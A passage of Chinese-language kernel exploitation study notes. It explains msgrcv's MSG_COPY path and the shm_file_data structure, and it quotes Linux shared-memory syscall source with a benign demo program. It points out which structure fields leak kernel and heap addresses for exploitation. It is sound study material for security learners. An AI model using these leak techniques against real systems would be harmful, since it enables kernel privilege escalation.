<p>（补充<code>MSG_COPY</code>细节，首先执行<code>copy = prepare_copy(buf, min_t(size_t, bufsz, ns-&gt;msg_ctlmax));</code>，其中<code>nv-&gt;msg_ctlmax=0x2000</code>，该函数会调用<code>load_msg(buf, bufsz)</code>申请相应大小的msg内存，并将buf内容拷贝进去（比如第二题exp中实际上会将堆空间0x2000字节拷贝进申请的copy msg中），返回的copy即新申请的msg指针；接着执行<code>msg = copy_msg(msg, copy);</code>，该函数将msg的所有data复制给copy，然后返回copy，并赋值给msg，也就是说之后msg就变成了刚才的copy_msg，实际上相当于根据传入的buf和size动态拷贝了一份并替代原msg，再之后就是<code>do_msg_fill</code>和<code>free_msg</code>）</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*memdump = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x1fc8</span><span style="color:#c0c5ce;">);
</span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid, memdump, </span><span style="color:#d08770;">0x1fc8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
</span></pre>
<h1 id="shm-file-data">shm_file_data</h1><p>进程间通信方式，共享内存</p>
<p><code>ipc/shm.c</code></p>
<p>kmalloc-32</p>
<p>ns、vm_ops可以泄露内核基址
file可以泄露堆区域</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">shm_file_data {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> id;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">ipc_namespace *ns;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">file *file;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">const struct </span><span style="color:#c0c5ce;">vm_operations_struct *vm_ops;
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>通过 shmget 系统调用创建共享内存之后通过 shmat 系统调用获得该结构体
通过 shmdt 释放该结构体</p>
<h2 id="shmget">shmget</h2><p>原型：<code>int shmget(key_t key, size_t size, int shmflg);</code></p>
<p>第一个参数，与信号量的semget函数一样，程序需要提供一个参数key（非0整数），它有效地为共享内存段命名，shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回-1.</p>
<p>不相关的进程可以通过该函数的返回值访问同一共享内存，它代表程序可能要使用的某个资源，程序对所有共享内存的访问都是间接的，程序先通过调用shmget()函数并提供一个键，再由系统生成一个相应的共享内存标识符（shmget()函数的返回值），只有shmget()函数才直接使用信号量键，所有其他的信号量函数使用由semget函数返回的信号量标识符。</p>
<p>第二个参数，size以字节为单位指定需要共享的内存容量</p>
<p>第三个参数，shmflg是权限标志，它的作用与open函数的mode参数一样，如果要想在key标识的共享内存不存在时，创建它的话，可以与IPC_CREAT做或操作。共享内存的权限标志与文件的读写权限一样，举例来说，0644,它表示允许一个进程创建的共享内存被内存创建者所拥有的进程向共享内存读取和写入数据，同时其他用户创建的进程只能读取共享内存。</p>
<p>创建共享内存，实际上是得到一个共享内存标识符或创建一个共享内存对象并返回共享内存标识符</p>
<p>当<code>shmflag</code>为<code>IPC_PRIVATE</code>时，调用链</p>
<p><code>ksys_shmget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newseg()</code></p>
<p>其中<code>ipcget_new</code>如下，调用函数指针<code>newseg</code></p>
<p><code>ipc/util.c</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/**
</span><span style="color:#65737e;"> * ipcget_new -	create a new ipc object
</span><span style="color:#65737e;"> * @ns: ipc namespace
</span><span style="color:#65737e;"> * @ids: ipc identifier set
</span><span style="color:#65737e;"> * @ops: the actual creation routine to call
</span><span style="color:#65737e;"> * @params: its parameters
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> * This routine is called by sys_msgget, sys_semget() and sys_shmget()
</span><span style="color:#65737e;"> * when the key is IPC_PRIVATE.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">ipcget_new</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ipc_namespace *</span><span style="color:#bf616a;">ns</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ipc_ids *</span><span style="color:#bf616a;">ids</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> ipc_ops *</span><span style="color:#bf616a;">ops</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ipc_params *</span><span style="color:#bf616a;">params</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">down_write</span><span style="color:#c0c5ce;">(&amp;ids-&gt;rwsem);
</span><span style="color:#c0c5ce;">	err = ops-&gt;</span><span style="color:#8fa1b3;">getnew</span><span style="color:#c0c5ce;">(ns, params);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">up_write</span><span style="color:#c0c5ce;">(&amp;ids-&gt;rwsem);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>kvmalloc</code>，大于一个page的时候，会先用kmalloc()进行__GFP_NORETRY的尝试，如果尝试失败就fallback到vmalloc（NORETRY标记避免了kmalloc在申请内存失败地情况下，反复尝试甚至做OOM来获得内存）</p>
<p>当然，kvmalloc()的size如果小于1个page，则沿用老的kmalloc()逻辑，而且也不会设置__GFP_NORETRY，如果反复尝试失败的话，也不会fallback到vmalloc()，因为vmalloc()申请小于1个page的内存是不合适的</p>
<p><code>ipc/shm.c</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/**
</span><span style="color:#65737e;"> * newseg - Create a new shared memory segment
</span><span style="color:#65737e;"> * @ns: namespace
</span><span style="color:#65737e;"> * @params: ptr to the structure that contains key, size and shmflg
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> * Called with shm_ids.rwsem held as a writer.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">newseg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ipc_namespace *</span><span style="color:#bf616a;">ns</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ipc_params *</span><span style="color:#bf616a;">params</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	[...]
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shmid_kernel *shp;
</span><span style="color:#c0c5ce;">	[...]
</span><span style="color:#c0c5ce;">	shp = </span><span style="color:#8fa1b3;">kvmalloc</span><span style="color:#c0c5ce;">(sizeof(*shp), GFP_KERNEL);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(!shp))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-ENOMEM;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	shp-&gt;shm_perm.</span><span style="color:#bf616a;">key </span><span style="color:#c0c5ce;">= key;
</span><span style="color:#c0c5ce;">	shp-&gt;shm_perm.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= (shmflg &amp; S_IRWXUGO);
</span><span style="color:#c0c5ce;">	shp-&gt;mlock_user = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	shp-&gt;shm_perm.</span><span style="color:#bf616a;">security </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	shp-&gt;shm_cprid = </span><span style="color:#8fa1b3;">get_pid</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">task_tgid</span><span style="color:#c0c5ce;">(current));
</span><span style="color:#c0c5ce;">	shp-&gt;shm_lprid = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	shp-&gt;shm_atim = shp-&gt;shm_dtim = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	shp-&gt;shm_ctim = </span><span style="color:#8fa1b3;">ktime_get_real_seconds</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">	shp-&gt;shm_segsz = size;
</span><span style="color:#c0c5ce;">	shp-&gt;shm_nattch = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	shp-&gt;shm_file = file;
</span><span style="color:#c0c5ce;">	shp-&gt;shm_creator = current;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	[...]
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="shmat">shmat</h2><p>at - attach</p>
<p>第一次创建完共享内存时，它还不能被任何进程访问，shmat()函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。它的原型如下：</p>
<p><code>void *shmat(int shm_id, const void *shm_addr, int shmflg);</code></p>
<p>第一个参数，shm_id是由shmget()函数返回的共享内存标识。</p>
<p>第二个参数，shm_addr指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址。</p>
<p>第三个参数，shm_flg是一组标志位，通常为0。</p>
<p>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1.</p>
<p><code>ipc/shm.c</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;"> * Fix shmaddr, allocate descriptor, map shm, add attach descriptor to lists.
</span><span style="color:#65737e;"> *
</span><span style="color:#65737e;"> * NOTE! Despite the name, this is NOT a direct system call entrypoint. The
</span><span style="color:#65737e;"> * &quot;raddr&quot; thing points to kernel space, and there has to be a wrapper around
</span><span style="color:#65737e;"> * this.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">long </span><span style="color:#8fa1b3;">do_shmat</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">shmid</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">shmaddr</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">shmflg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	      ulong *</span><span style="color:#bf616a;">raddr</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned long </span><span style="color:#bf616a;">shmlba</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shmid_kernel *shp;
</span><span style="color:#c0c5ce;">	[...]
</span><span style="color:#c0c5ce;">	sfd = </span><span style="color:#8fa1b3;">kzalloc</span><span style="color:#c0c5ce;">(sizeof(*sfd), GFP_KERNEL);
</span><span style="color:#c0c5ce;">	[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	sfd-&gt;id = shp-&gt;shm_perm.</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	sfd-&gt;ns = </span><span style="color:#8fa1b3;">get_ipc_ns</span><span style="color:#c0c5ce;">(ns);
</span><span style="color:#c0c5ce;">	sfd-&gt;file = base;
</span><span style="color:#c0c5ce;">	sfd-&gt;vm_ops = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	file-&gt;private_data = sfd;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	[...]
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="shmdt">shmdt</h2><p>dt - detach</p>
<p>该函数用于将共享内存从当前进程中分离。注意，将共享内存分离并不是删除它，只是使该共享内存对当前进程不再可用。它的原型如下：</p>
<p><code>int shmdt(const void *shmaddr);</code></p>
<h2 id="shmctl">shmctl</h2><p>ctl - control</p>
<p>用来控制共享内存</p>
<p>原型：<code>int shmctl(int shm_id, int command, struct shmid_ds *buf);</code></p>
<p>第一个参数，shm_id是shmget()函数返回的共享内存标识符。</p>
<p>第二个参数，command是要采取的操作，它可以取下面的三个值 （其实不止，详见下面源码）：</p>
<p>IPC_STAT：把shmid_ds结构中的数据设置为共享内存的当前关联值，即用共享内存的当前关联值覆盖shmid_ds的值。
IPC_SET：如果进程有足够的权限，就把共享内存的当前关联值设置为shmid_ds结构中给出的值
IPC_RMID：删除共享内存段</p>
<p>第三个参数，buf是一个结构指针，它指向共享内存模式和访问权限的结构。</p>
<p><code>shmid_ds</code>结构 至少包括以下成员：</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">shmid_ds
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    uid_t shm_perm.</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    uid_t shm_perm.</span><span style="color:#bf616a;">gid</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    mode_t shm_perm.</span><span style="color:#bf616a;">mode</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">};
</span></pre>
<p><code>ipc/shm.c</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">ksys_shmctl</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">shmid</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shmid_ds __user *</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">version</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ipc_namespace *ns;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shmid64_ds sem64;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(cmd &lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| shmid &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	ns = current-&gt;nsproxy-&gt;ipc_ns;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(cmd) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> IPC_INFO: {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shminfo64 shminfo;
</span><span style="color:#c0c5ce;">		err = </span><span style="color:#8fa1b3;">shmctl_ipc_info</span><span style="color:#c0c5ce;">(ns, &amp;shminfo);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_shminfo_to_user</span><span style="color:#c0c5ce;">(buf, &amp;shminfo, version))
</span><span style="color:#c0c5ce;">			err = -EFAULT;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> SHM_INFO: {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shm_info shm_info;
</span><span style="color:#c0c5ce;">		err = </span><span style="color:#8fa1b3;">shmctl_shm_info</span><span style="color:#c0c5ce;">(ns, &amp;shm_info);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_to_user</span><span style="color:#c0c5ce;">(buf, &amp;shm_info, sizeof(shm_info)))
</span><span style="color:#c0c5ce;">			err = -EFAULT;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> SHM_STAT:
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> SHM_STAT_ANY:
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> IPC_STAT: {
</span><span style="color:#c0c5ce;">		err = </span><span style="color:#8fa1b3;">shmctl_stat</span><span style="color:#c0c5ce;">(ns, shmid, cmd, &amp;sem64);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_shmid_to_user</span><span style="color:#c0c5ce;">(buf, &amp;sem64, version))
</span><span style="color:#c0c5ce;">			err = -EFAULT;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> IPC_SET:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_shmid_from_user</span><span style="color:#c0c5ce;">(&amp;sem64, buf, version))
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* fallthru */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> IPC_RMID:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">shmctl_down</span><span style="color:#c0c5ce;">(ns, shmid, cmd, &amp;sem64);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> SHM_LOCK:
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> SHM_UNLOCK:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">shmctl_do_lock</span><span style="color:#c0c5ce;">(ns, shmid, cmd);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="shi-li">示例</h2><p><code>shmread.c</code>创建共享内存，并读取其中的信息，另一个文件<code>shmwrite.c</code>向共享内存中写入数据。为了方便操作和数据结构的统一，为这两个文件定义了相同的数据结构，定义在文件<code>shmdata.c</code>中。结构<code>shared_use_st</code>中的<code>written</code>作为一个可读或可写的标志，非0：表示可读，0：表示可写，text则是内存中的文件。</p>
<h3 id="shmdata-h">shmdata.h</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#ifndef</span><span style="color:#c0c5ce;"> _SHMDATA_H_HEADER
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_SHMDATA_H_HEADER
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">TEXT_SZ </span><span style="color:#d08770;">2048
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">shared_use_st
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> written; </span><span style="color:#65737e;">// 作为一个标志，非0：表示可读，0：表示可写
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> text[TEXT_SZ]; </span><span style="color:#65737e;">// 记录写入 和 读取 的文本
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#b48ead;">#endif
</span></pre>
<h3 id="shmread-c">shmread.c</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stddef.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/shm.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">shmdata.h</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*shm = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shared_use_st *shared; </span><span style="color:#65737e;">// 指向shm
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> shmid; </span><span style="color:#65737e;">// 共享内存标识符
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 创建共享内存
</span><span style="color:#c0c5ce;">    shmid = </span><span style="color:#8fa1b3;">shmget</span><span style="color:#c0c5ce;">((key_t)</span><span style="color:#d08770;">1234</span><span style="color:#c0c5ce;">, sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shared_use_st), </span><span style="color:#d08770;">0666</span><span style="color:#c0c5ce;">|IPC_CREAT);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(shmid == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">shmat failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 将共享内存连接到当前进程的地址空间
</span><span style="color:#c0c5ce;">    shm = </span><span style="color:#8fa1b3;">shmat</span><span style="color:#c0c5ce;">(shmid, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(shm == (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">shmat failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">Memory attached at </span><span style="color:#d08770;">%X</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">)shm);
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 设置共享内存
</span><span style="color:#c0c5ce;">    shared = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shared_use_st*)shm; </span><span style="color:#65737e;">// 注意：shm有点类似通过 malloc() 获取到的内存，所以这里需要做个 类型强制转换
</span><span style="color:#c0c5ce;">    shared-&gt;written = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// 读取共享内存中的数据
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 没有进程向内存写数据，有数据可读取
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(shared-&gt;written == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">You wrote: </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, shared-&gt;text);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">// 读取完数据，设置written使共享内存段可写
</span><span style="color:#c0c5ce;">            shared-&gt;written = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">// 输入了 end，退出循环（程序）
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strncmp</span><span style="color:#c0c5ce;">(shared-&gt;text, &quot;</span><span style="color:#a3be8c;">end</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">            {
